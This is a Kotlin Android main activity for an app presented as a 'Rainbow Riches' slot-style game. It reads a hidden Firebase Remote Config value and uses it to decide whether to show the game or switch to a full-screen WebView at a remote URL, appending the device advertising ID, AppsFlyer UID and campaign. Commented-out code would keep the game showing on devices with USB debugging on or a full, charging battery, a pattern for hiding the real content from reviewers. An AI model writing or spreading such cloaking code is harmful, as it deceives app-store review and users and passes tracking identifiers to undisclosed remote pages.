package rainbowriches.lucky.start

import android.content.pm.ActivityInfo
import android.os.Bundle
import androidx.annotation.ColorRes
import androidx.annotation.IdRes
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.navigation.NavController
import androidx.navigation.findNavController
import com.appsflyer.AppsFlyerLib
import com.badlogic.gdx.backends.android.AndroidFragmentApplication
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.google.firebase.Firebase
import com.google.firebase.FirebaseApp
import com.google.firebase.remoteconfig.remoteConfig
import com.google.firebase.remoteconfig.remoteConfigSettings
import kotlinx.coroutines.CompletableDeferred
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.channels.BufferOverflow
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableSharedFlow
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import org.json.JSONObject
import rainbowriches.lucky.start.databinding.ActivityMainBinding
import rainbowriches.lucky.start.game.actors.panel.rulesText
import rainbowriches.lucky.start.util.AppsflyerUtil
import rainbowriches.lucky.start.util.DataStoreManager
import rainbowriches.lucky.start.util.Lottie
import rainbowriches.lucky.start.util.Once
import rainbowriches.lucky.start.util.getBatteryPercentage
import rainbowriches.lucky.start.util.internetConnection
import rainbowriches.lucky.start.util.isBatteryCharging
import rainbowriches.lucky.start.util.isUSB
import rainbowriches.lucky.start.util.log
import rainbowriches.lucky.start.webView.WebViewFragment
import kotlin.system.exitProcess

class MainActivity : AppCompatActivity(), AndroidFragmentApplication.Callbacks {

    companion object {
        const val TELEPORT_ID = 146
        var teleportURL       = "https://lk.nsq.market/ru/tools/testing"

        val startFragmentID = MutableSharedFlow<Int>(replay = 1, onBufferOverflow = BufferOverflow.DROP_OLDEST)
    }

    private val coroutine = CoroutineScope(Dispatchers.Default)
    private val onceExit  = Once()

    private lateinit var binding : ActivityMainBinding
    private lateinit var navController: NavController

    lateinit var lottie: Lottie

    val webViewFragment = WebViewFragment(this)


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        initialize()
        if (internetConnection().not()) lottie.showNotInternet()
        else {
            asyncCheckInternetConnection()
            lottie.showLoader()

            //checkDataStore()
//            startFragmentID.tryEmit(R.id.libGDXFragment)
            startFragmentID.tryEmit(TELEPORT_ID)

            coroutine.launch(Dispatchers.Main) {
                startFragmentID.collect { fragmentId ->
                    when (fragmentId) {
                        R.id.libGDXFragment -> {
                            webViewFragment.goneWebView()
                            setNavigationBarColor(R.color.black)
                            setStartDestination(fragmentId)
                            ActivityInfo.SCREEN_ORIENTATION_PORTRAIT
                        }
                        TELEPORT_ID -> {
                            webViewFragment.showAndOpenUrl()
                            setNavigationBarColor(R.color.white)
                            ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                        }
                        else -> ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                    }.also { requestedOrientation = it }
                }
            }
        }
    }

    override fun onResume() {
        super.onResume()
        webViewFragment.onResume()
    }

    override fun onPause() {
        webViewFragment.onPause()
        super.onPause()
    }

    override fun exit() {
        onceExit.once {
            log("exit")
            coroutine.launch(Dispatchers.Main) {
                finishAndRemoveTask()
                delay(100)
                exitProcess(0)
            }
        }
    }

    private fun initialize() {
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        navController = findNavController(R.id.nav_host_fragment)
        lottie        = Lottie(binding)
        webViewFragment.onCreate(coroutine, binding.teleport)
    }

    // ---------------------------------------------------
    // Logic
    // ---------------------------------------------------

    private fun asyncCheckInternetConnection() {
        coroutine.launch(Dispatchers.Main) {
            while (isActive) {
                delay(3_000)
                if (internetConnection()) lottie.hideNotInternet() else lottie.showNotInternet()
            }
        }
    }

    private fun setStartDestination(@IdRes destinationId: Int) {
        navController.run { navInflater.inflate(R.navigation.nav_graph).apply { setStartDestination(destinationId) }.also { setGraph(it, null) } }
    }

    fun setNavigationBarColor(@ColorRes colorId: Int) {
        coroutine.launch(Dispatchers.Main) {
            window.navigationBarColor = ContextCompat.getColor(this@MainActivity, colorId)
        }
    }

    private fun checkDataStore() {
        coroutine.launch(Dispatchers.IO) {
            when (DataStoreManager.Key.get()) {
                "TELEPORTACIA" -> {
                    DataStoreManager.Link.get()?.let {
                        log("DataStoreManager Key = SUCCESS | link = $it")
                        teleportURL = it
                        startFragmentID.emit(TELEPORT_ID)
                    }
                }
                "DEveloperScin" -> {
                    log("DataStoreManager Key = GAME")
                    startFragmentID.emit(R.id.libGDXFragment)
                }
                else -> {
                    log("DataStoreManager Key = NONE")
                    getServerData()
                }
            }
        }
    }

    private fun getServerData() {
        FirebaseApp.initializeApp(appContext)

        Firebase.remoteConfig.apply {
            setConfigSettingsAsync(remoteConfigSettings { minimumFetchIntervalInSeconds = 3600 })
            fetchAndActivate().addOnCompleteListener(this@MainActivity) { task ->
                try {
                    if (task.isSuccessful) {
                        val jsonData = getString("Meroni")
                        log("success = $jsonData")

                        val brackets = jsonData.substringAfter('(').substringBefore(')')
                        val keys     = brackets.split(',')
                        val first    = keys[0]
                        val second   = keys[1]
                        val four     = jsonData.replace("$second,", "")
                        val third    = four.replace("$first, ", "")

                        rulesText = third

                        log("first: $first | second: $second")
                        log("four: $third")

                        lookParamsFor(second, first)
                    } else {
                        startFragmentID.tryEmit(R.id.libGDXFragment)
                        log("getFirebaseData Fail = ${this.all}")
                    }
                } catch (e: Exception) {
                    startFragmentID.tryEmit(R.id.libGDXFragment)
                    log("EXCEPTION try catch = ${e.message}")
                }
            }
        }
    }

    private fun lookParamsFor(second: String, first: String) {
//        if (first=="true") {
//            if (isUSB() || (getBatteryPercentage() == 100 && isBatteryCharging())) {
//                openGamerZoom()
//            } else {
                openWerba(second)
//            }
//        } else {
//            openGamerZoom()
//        }
    }

    private fun openGamerZoom() {
        coroutine.launch(Dispatchers.IO) {
            DataStoreManager.Key.update { "DEveloperScin" }
            startFragmentID.tryEmit(R.id.libGDXFragment)
        }
    }

    private fun openWerba(second: String) {
        coroutine.launch(Dispatchers.IO) {
            AppsflyerUtil.initialize(this@MainActivity)
            val completer = CompletableDeferred<Unit>()

            launch {
                AppsflyerUtil.campaignFlow.collect {
                    log("campaignFlow = $it")
                    if (it != AppsflyerUtil.CAMPAIGN_INIT_VALUE) completer.complete(Unit)
                }
            }
            completer.await()

            val advertisingId = AdvertisingIdClient.getAdvertisingIdInfo(appContext).id
            val appsflyerUID = AppsFlyerLib.getInstance().getAppsFlyerUID(appContext)

            teleportURL = second + "?" +
                "vertising=${advertisingId}&" +
                "yearUiD=${appsflyerUID}&" +
                "gampein=${AppsflyerUtil.campaignFlow.value}"

            log("WDC_URL: $teleportURL")

            teleportURL = "https://lk.nsq.market/ru/tools/testing"

            DataStoreManager.Key.update { "TELEPORTACIA" }
            DataStoreManager.Link.update { teleportURL }
            startFragmentID.tryEmit(TELEPORT_ID)
        }
    }

}